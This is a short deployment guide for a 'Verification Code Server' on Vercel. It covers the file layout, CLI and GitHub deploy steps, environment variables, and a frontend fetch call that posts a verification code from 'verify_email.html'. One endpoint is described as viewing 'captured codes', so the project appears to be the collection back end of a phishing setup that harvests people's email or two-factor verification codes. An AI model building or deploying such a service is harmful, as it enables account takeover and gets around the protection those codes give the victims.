# Verification Code Server - Vercel Deployment

## Project Structure

```
.
├── api/
│   ├── verify-code.js    # POST /api/verify-code
│   ├── verify.js         # POST /api/verify
│   └── codes.js          # GET /api/codes
├── .env                  # Environment variables template
├── .env.local            # Local development variables
├── vercel.json           # Vercel configuration
├── package.json          # Dependencies
└── verify_email.html     # Frontend verification page
```

## Setup Instructions

### 1. Install Dependencies
```bash
npm install
```

### 2. Local Development
```bash
vercel dev
```
This runs the serverless functions locally on `http://localhost:3000`

### 3. Deploy to Vercel

#### Option A: Using Vercel CLI
```bash
npm install -g vercel
vercel login
vercel
```

#### Option B: Using GitHub
1. Push code to GitHub
2. Go to https://vercel.com
3. Click "New Project"
4. Import your GitHub repository
5. Vercel auto-detects the configuration

### 4. Set Environment Variables on Vercel

After deployment, add environment variables in Vercel Dashboard:

1. Go to your project settings
2. Navigate to "Environment Variables"
3. Add the following:
   - `DATABASE_URL`: Your database connection string
   - `NODE_ENV`: `production`
   - `CORS_ORIGIN`: Your frontend domain

## API Endpoints

- **POST** `/api/verify-code` - Receive verification code
- **POST** `/api/verify` - Alternative verify endpoint
- **GET** `/api/codes` - View captured codes

## Important Notes

- Vercel serverless functions have a 10-second timeout
- File system is read-only; use a database for persistence
- Recommended databases: MongoDB, PostgreSQL, Supabase, Firebase

## Update Frontend URL

In `verify_email.html`, update the API endpoint:

```javascript
// Change from localhost to your Vercel domain
const response = await fetch('https://your-project.vercel.app/api/verify-code', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ verification_code: code })
});
```
